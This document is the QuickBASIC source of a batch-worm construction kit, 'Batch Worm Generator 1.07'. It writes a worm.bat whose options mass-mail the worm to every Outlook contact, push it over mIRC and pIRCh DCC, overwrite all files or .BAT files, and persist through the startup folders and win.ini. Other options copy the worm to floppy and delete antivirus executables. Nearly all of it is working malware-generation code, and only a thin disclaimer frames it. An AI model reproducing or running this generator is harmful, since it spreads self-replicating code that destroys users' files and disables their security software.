headline:
CLS
REM SeCoNd PaRt To HeLl's
REM BATCH WORM GENERATOR 1.07
name$ = "BATCH WORM GENERATOR 1.07"
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT " WRITE WORM (1)"
PRINT " INFORMATION (2)"
PRINT " THANKS AND GREETS (3)"
PRINT " END (4)"
PRINT ""
INPUT " Please choose: ", beginn
IF beginn = 1 THEN GOTO VIRUSERSTELLEN
IF beginn = 2 THEN GOTO INFORMATION
IF beginn = 3 THEN GOTO TAG
IF beginn = 4 THEN GOTO ENDE
GOTO headline
INFORMATION:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT "                     Inforationen about Batch Worm Generator"
PRINT ""
PRINT " First I have to say, that spreading a cumputervirus is unlawful in the most"
PRINT " states in the world. Because of this, you should use your program only for"
PRINT " learning something about computerviruses! I'm NOT guilt about some harm or"
PRINT " confrontation with the lay!!!"
PRINT ""
COLOR 2
PRINT " Somethin else:"
COLOR 7
PRINT " I've not build harmful functions in my programm, because I don't want that a"
PRINT " viruswriter less the pleasure of writing viruses..."
PRINT ""
INPUT " press enter...", nix$
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT " Something VERY IMPORTANT FOR ME: If you have problems with the program,"
PRINT " or the program made a bugging worm, or you have a suggestion to make my"
PRINT " program better, please write me an eMail:"
COLOR 2
PRINT " SPTH@jet2web.cc"
COLOR 7
PRINT ""
PRINT " I try to fix the bugs fast as i can, and upload the program to this site:"
COLOR 2
PRINT " http://www.spth.de.vu"
COLOR 7
PRINT ""
PRINT " greets,"
PRINT ""
PRINT " SeCoNd PaRt To HeLl"
PRINT ""
INPUT " press enter...", nix$
GOTO headline

TAG:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Thanks:"
COLOR 7
PRINT
PRINT " SnakeByte ->> for his QuickBasic-Help [www.kryptocrew.de/snakebyte]"
PRINT " VorteX    ->> for his nice suggestions to improve the BWG and Batch virii!"
PRINT " Worf      ->> for his Batch Virii ;-)"
PRINT " szule     ->> for his Batch virii!"
PRINT " Positron  ->> BWG help!"
PRINT " Black Cat ->> Put the BWG at his HomePage!!"
INPUT " press enter... ", nix$
GOTO headline


PRINT ""
VIRUSERSTELLEN:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
OPEN "worm.bat" FOR OUTPUT AS #1
INPUT " Name of the worm: ", virname$
PRINT #1, "@echo off"
PRINT #1, "REM Name:", virname$, ""
INPUT " Name of the Author: ", virautor$
IF virautor$ = "SPTH" THEN GOTO SPTHVir
IF virautor$ = "spth" THEN GOTO SPTHVir
IF virautor$ = "SeCoNd PaRt To HeLl" THEN GOTO SPTHVir
GOTO SPTHVirEnd
SPTHVir:
COLOR 5
PRINT " Are you crazy??"
COLOR 7
SPTHVirEnd:
PRINT #1, "REM Author: ", virautor$, ""
PRINT #1, "REM generated with "; name$
INPUT " The main-filename of the virus (file.BAT): ", MyS$
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Activate of the worm:"
COLOR 7
INPUT " Shall the worm copy to the german start up (Y/N): ", akt$
IF akt$ = "Y" THEN DeuAutoSt = 1
IF akt$ = "y" THEN DeuAutoSt = 1
INPUT " Shall the worm copy to the english start up (Y/N): ", eas$
IF eas$ = "Y" THEN EngAutoSt = 1
IF eas$ = "y" THEN EngAutoSt = 1
INPUT " Shall the worm copy itself to a logic hard drive (Y/N): ", ll$
IF ll$ = "Y" THEN LogLauf = 1
IF ll$ = "y" THEN LogLauf = 1
INPUT " Shall the worm activate itself with the win.ini (Y/N): ", wini$
IF wini$ = "Y" THEN WinINI = 1
IF wini$ = "y" THEN WinINI = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
COLOR 4
PRINT " Spreading with the internet:"
COLOR 7
INPUT " Shall the worm spreading with MS-Outlook eMails (Y/N): ", msol$
IF msol$ = "Y" THEN Outlook = 1
IF msol$ = "y" THEN Outlook = 1
IF Outlook = 1 THEN GOTO AuswahlOL
GOTO AuswahlOLEnd
AuswahlOL:
INPUT " --> Which subject: ", OLSubject$
INPUT " --> Which body: ", OLBody$
INPUT " --> Which attachment (pics.BAT): ", OLAttachment$
AuswahlOLEnd:
INPUT " Shall the worm spreading with mIRC (Y/N): ", IRC$
IF IRC$ = "Y" THEN mIRC = 1
IF IRC$ = "y" THEN mIRC = 1
IF mIRC = 1 THEN GOTO AuswahlmIRC
GOTO AuswahlmIRCEnd
AuswahlmIRC:
INPUT " --> Which name of the file (funny.jpg.BAT): ", mIRCAttachment$
AuswahlmIRCEnd:
INPUT " Shall the worm spreading with pIRCh (Y/N): ", pircha$
IF pircha$ = "Y" THEN pirchb = 1
IF pircha$ = "y" THEN pirchb = 1
IF pirchb = 1 THEN GOTO AuswahlpIRCh
GOTO AuswahlpIRChEnd
AuswahlpIRCh:
INPUT " --> Which name of the file (lala.arv.BAT): ", pIRChAttachment$
AuswahlpIRChEnd:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
 
COLOR 4
PRINT " Spreading with the PC:"
COLOR 7
INPUT " Shall the worm infect all data fils (Y/N): ", AD$
IF AD$ = "Y" THEN AlleDateien = 1
IF AD$ = "y" THEN AlleDateien = 1
IF AlleDateien = 0 THEN GOTO BatInfektionen
GOTO BatInfektionenEnd
BatInfektionen:
INPUT " Shall the worm infect all .BAT files (Y/N): ", BIF$
IF BIF$ = "Y" THEN BatDateienInf = 1
IF BIF$ = "y" THEN BatDateienInf = 1
BatInfektionenEnd:
INPUT " Shall the worm infect Windows-root (Y/N): ", WD$
IF WD$ = "Y" THEN WinDir = 1
IF WD$ = "y" THEN WinDir = 1
INPUT " Shall the worm copy on the Desktop (Y/N): ", desk$
IF desk$ = "Y" THEN Desktop = 1
IF desk$ = "y" THEN Desktop = 1
INPUT " Shall the worm copy to a Disk (Y/N): ", Adisk$
IF Adisk$ = "Y" THEN Diskette = 1
IF Adisk$ = "y" THEN Diskette = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Others:"
COLOR 7
INPUT " Shall the Worm write a message (Y/N): ", massag$
IF massag$ = "Y" THEN mesg = 1
IF massag$ = "y" THEN mesg = 1
IF mesg = 1 THEN GOTO Wmsg
GOTO WmsgEnd
Wmsg:
INPUT " --> Which message: ", msg$
WmsgEnd:
INPUT " Shall the Worm delete some AV programs (Y/N): ", Dav$
IF Dav$ = "Y" THEN DelAV = 1
IF Dav$ = "y" THEN DelAV = 1
INPUT " press enter... ", A
MakeWorm:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT #1, "ctty nul"
PRINT #1, "Set MyS=%0"
PRINT #1, "copy %MyS% "; MyS$; ""
IF Outlook = 1 THEN GOTO OL
GOTO OLend
OL:
PRINT #1, "copy "; MyS$; " C:\"; OLAttachment$
PRINT #1, "copy "; MyS$; " C:\email.vbs"
PRINT #1, "echo Dim x > C:\email.vbs"
PRINT #1, "echo.on error resume next >> C:\email.vbs"
PRINT #1, "echo Set fso ="; CHR$(34); " Scripting.FileSystem.Object"; CHR$(34); " >> C:\email.vbs"
PRINT #1, "echo Set so=CreateObject(fso) >> C:\email.vbs"
PRINT #1, "echo Set ol=CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ") >> C:\email.vbs"
PRINT #1, "echo Set out= WScript.CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ") >> C:\email.vbs"
PRINT #1, "echo Set mapi = out.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ") >> C:\email.vbs"
PRINT #1, "echo Set a = mapi.AddressLists(1) >> C:\email.vbs"
PRINT #1, "echo For x=1 To a.AddressEntries.Count >> C:\email.vbs"
PRINT #1, "echo Set Mail=ol.CreateItem(0) >> C:\email.vbs"
PRINT #1, "echo Mail.to=ol.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ").AddressLists(1).AddressEntries(x) >> C:\email.vbs"
PRINT #1, "echo Mail.Subject="; CHR$(34); OLSubject$; CHR$(34); " >> C:\email.vbs"
PRINT #1, "echo Mail.Body="; CHR$(34); OLBody$; CHR$(34); " >> C:\email.vbs"
PRINT #1, "echo Mail.Attachments.Add("; CHR$(34); "C:\"; OLAttachment$; CHR$(34); ") >> C:\email.vbs"
PRINT #1, "echo Mail.Send >> C:\email.vbs"
PRINT #1, "echo Next >> C:\email.vbs"
PRINT #1, "echo ol.Quit >> C:\email.vbs"
PRINT #1, "cscript C:\email.vbs"
PRINT #1, "@del C:\email.vbs"
PRINT #1, "@del C:\"; OLAttachment$
OLend:
IF mIRC = 1 THEN GOTO mir
GOTO IRCENDE
mir:
PRINT #1, "md C:\pro"
PRINT #1, "copy "; MyS$; " C:\pro\"; mIRCAttachment$; ""
PRINT #1, "if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini"
PRINT #1, "if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini"
PRINT #1, "if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini"
PRINT #1, "if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini"
PRINT #1, "set spp=dcc send $nick C:\pro\"; mIRCAttachment$; ""
PRINT #1, "echo [script] > %mIRC%"
PRINT #1, "echo n0=on 1:filesent:*.*: { if ( $nick !=$me ) {halt} /%spp% } >>%mIRC%"
IRCENDE:
IF pirchb = 1 THEN GOTO PIRCH
GOTO PIRCHEND
PIRCH:
PRINT #1, "if exist C:\pirch98\events.ini goto pir"
PRINT #1, "goto pirend"
PRINT #1, ":pir"
PRINT #1, "copy "; MyS$; " %WinDir%\"; pIRChAttachment$; ""
PRINT #1, "echo [Levels] > C:\Pirch98\events.ini"
PRINT #1, "echo Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Count=6 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level1=000-Unknows >> C:\Pirch98\events.ini"
PRINT #1, "echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level2=100-Level 100 >> C:\Pirch98\events.ini"
PRINT #1, "echo 100-Level 100Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level3=200-Level 200 >> C:\Pirch98\events.ini"
PRINT #1, "echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level4=300-Level 300 >> C:\Pirch98\events.ini"
PRINT #1, "echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level5=400-Level 400 >> C:\Pirch98\events.ini"
PRINT #1, "echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Level6=500-Level 500 >> C:\Pirch98\events.ini"
PRINT #1, "echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo [000-Unknowns] >> C:\Pirch98\events.ini"
PRINT #1, "echo User1=*!*@* >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo Events1= ON JOIN:#: /dcc send $nick %WinDir%\"; pIRChAttachment$; " >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=1 >> C:\Pirch98\events.ini"
PRINT #1, "echo [100-Level 100] >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo [200-Level 200] >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo [300-Level 300] >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo [400-Level 400] >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo [500-Level 500] >> C:\Pirch98\events.ini"
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"
PRINT #1, ":pirend"
PIRCHEND:
IF BatDateienInf = 1 THEN GOTO BatDatei
GOTO BatDateiEnd
BatDaA = INT(RND * 2) + 1
BatDatei:
IF BatDaA = 1 THEN PRINT #1, "copy "; MyS$; " %winDir%\love.bat"
IF BatDaA = 1 THEN PRINT #1, "for %%v in (*.bat ..\*.bat \*.bat) do copy %WinDir%\love.bat %%v"
IF BatDaA = 1 THEN PRINT #1, "@del %WinDir%\love.bat"
IF BatDaA = 2 THEN PRINT #1, "copy "; MyS$; " C:\lala.bat"
IF BatDaA = 2 THEN PRINT #1, "for %%v in (*.bat ..\*.bat \*.bat) do copy C:\lala.bat %%v"
IF BatDaA = 2 THEN PRINT #1, "@del C:\lala.bat"
BatDateiEnd:
IF DeuAutoSt = 1 THEN GOTO Deuaustart
GOTO deuautostend
Deuaustart:
deuautoSta = INT(RND * 3) + 1
IF deuautoSta = 1 THEN PRINT #1, "copy "; MyS$; " %windir%\startm~1\progra~1\autost~1\*.bat"
IF deuautoSta = 2 THEN PRINT #1, "copy "; MyS$; " C:\WS.bat"
IF deuautoSta = 2 THEN PRINT #1, "copy C:\WS.bat %windir%\startm~1\progra~1\autost~1\*.bat"
IF deuautoSta = 2 THEN PRINT #1, "@del C:\WS.bat"
IF deuautoSta = 3 THEN PRINT #1, "copy "; MyS$; " C:\Affe.zyy"
IF deuautoSta = 3 THEN PRINT #1, "ren C:\Affe.zyy AS.bat"
IF deuautoSta = 3 THEN PRINT #1, "move C:\AS.bat %windir%\startm~1\progra~1\autost~1"
deuautostend:
IF EngAutoSt = 1 THEN GOTO EngAuSt
GOTO EngAuStEnd
EngAuSt:
PRINT #1, "copy "; MyS$; " %windir%\Start Menu\Programs\StartUp\StartUp.bat"
EngAuStEnd:
IF LogLauf = 1 GOTO LogLaufwerk
GOTO AD
LogLaufwerk:
llf = INT(RND * 2) + 1
IF llf = 1 THEN PRINT #1, "md C:\subs"
IF llf = 1 THEN PRINT #1, "copy "; MyS$; " C:\subs"
IF llf = 1 THEN PRINT #1, "subst L: C:\subs"
IF llf = 2 THEN PRINT #1, "md C:\suPs"
IF llf = 2 THEN PRINT #1, "copy "; MyS$; " C:\suPs\olaf.xyv"
IF llf = 2 THEN PRINT #1, "ren C:\suPs\olaf.xyv snake.bat"
IF llf = 2 THEN PRINT #1, "subst L: C:\suPs"
AD:
IF AlleDateien = 1 THEN GOTO AlleD
GOTO WD

AlleD:
AlleDR = INT(RND * 2) + 1
IF AlleDR = 1 THEN PRINT #1, "for %%v in (*.*) do copy "; MyS$; " *.*"
IF AlleDR = 1 THEN PRINT #1, "for %%v in (*.*) do ren *.* *.bat"
IF AlleDR = 2 THEN PRINT #1, "for %%v in (*.*) do copy "; MyS$; " C:\hamlet.bat"
IF AlleDR = 2 THEN PRINT #1, "for %%v in (*.*) do copy C:\hamlet.bat %%v"
IF AlleDR = 2 THEN PRINT #1, "for %%v in (*.*) do ren *.* *.bat"
IF AlleDR = 2 THEN PRINT #1, "@del C:\hamlet.bat"
WD:
IF WinDir = 1 THEN GOTO WinD
GOTO EndWinD
WinD:
WinDR = INT(RND * 2) + 1
IF WinDR = 1 THEN PRINT #1, "copy "; MyS$; " C:\wd.bat"
IF WinDR = 1 THEN PRINT #1, "for %%w in (%windir%\*.bat) do copy C:\wd.bat %%w"
IF WinDR = 1 THEN PRINT #1, "@del C:\wd.bat"
IF WinDR = 2 THEN PRINT #1, "ren %WinDir%\*.bat *.ifk"
IF WinDR = 2 THEN PRINT #1, "copy "; MyS$; " C:\wid.lal"
IF WinDR = 2 THEN PRINT #1, "for %%w in (%windir%\*.ifk) do copy C:\wid.lal %%w"
IF WinDR = 2 THEN PRINT #1, "ren %windir%\*.ifk *.bat"
IF WinDR = 2 THEN PRINT #1, "@del C:\wid.lal"
EndWinD:
IF WinINI = 1 GOTO WiINI
GOTO WiINIEnd
WiINI:
PRINT #1, "copy "; MyS$; " %WinDir%\system\WINI.bat"
PRINT #1, "echo [windows] >funny.bat"
PRINT #1, "echo load=%windir%\system\WINI.bat >>funny.bat"
PRINT #1, "echo run=%windir%\system\WINI.bat >>funny.bat"
PRINT #1, "echo NullPort=None >>funny.bat"
PRINT #1, "copy funny.bat %windir%\dd.ini"
PRINT #1, "@del %windir%\win.ini"
PRINT #1, "@del funny.bat"
PRINT #1, "ren %windir%\dd.ini win.ini"
WiINIEnd:
IF Desktop = 1 THEN GOTO Desktp
GOTO Desktpend
Desktp:
DesktopR = INT(RND * 2) + 1
IF DesktopR = 1 THEN PRINT #1, "copy "; MyS$; " %windir%\Desktop\*.bat"
IF DesktopR = 2 THEN PRINT #1, "copy "; MyS$; " %windir%\Desktop\*.ifk"
IF DesktopR = 2 THEN PRINT #1, "ren %windir%\Desktop\*.ifk *.bat"
Desktpend:
IF Diskette = 1 THEN GOTO DiskAdisK
GOTO DiskAdisKEnd
DiskAdisK:
PRINT #1, "command /f /c copy "; MyS$; " A:\"
DiskAdisKEnd:
PRINT #1, "@del "; MyS$; ""
IF DelAV = 1 THEN GOTO AVD
GOTO AVDEnd
AVD:
PRINT #1, "@del C:\progra~1\kasper~1\avp32.exe"
PRINT #1, "@del C:\progra~1\norton~1\*.exe"
PRINT #1, "@del C:\progra~1\trojan~1\tc.exe"
AVDEnd:
PRINT #1, "ctty CON"
IF mesg = 1 THEN PRINT #1, "echo "; msg$
CLOSE #1
PRINT ""
PRINT " The worm was saved as worm.bat!"
PRINT ""
PRINT " Please write the INFORMATION."
PRINT ""
PRINT " Thanks for using "; name$; " !!"
PRINT " A new version of the programm is here:"
COLOR 4
PRINT " http://www.SPTH.de.vu"
PRINT ""
PRINT ""
PRINT "                                         YOURS"
PRINT "                                 Second Part To Hell"
COLOR 7
PRINT ""
INPUT " Press enter... ", nix$
GOTO headline
ENDE:

